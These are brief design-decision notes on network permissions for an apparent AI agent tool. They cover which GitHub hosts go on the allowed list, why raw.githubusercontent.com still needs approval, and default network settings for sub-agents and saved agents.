- Q1 yes: the registries list includes GitHub release and download hosts
  (`github.com`, `codeload.github.com`, `objects.githubusercontent.com`);
  `raw.githubusercontent.com` stays on the card because it serves any user
  content. Exact HTTPS hosts only, like the rest of the list.
- Q2/Q3: network settings are not workspace files (see Constraints, item 6).
- Q5: sub-agents follow the parent chat with no cards; saved agents get a
  `network` field, default off.
- Q4 and Q6 to Q10 accepted as recommended.
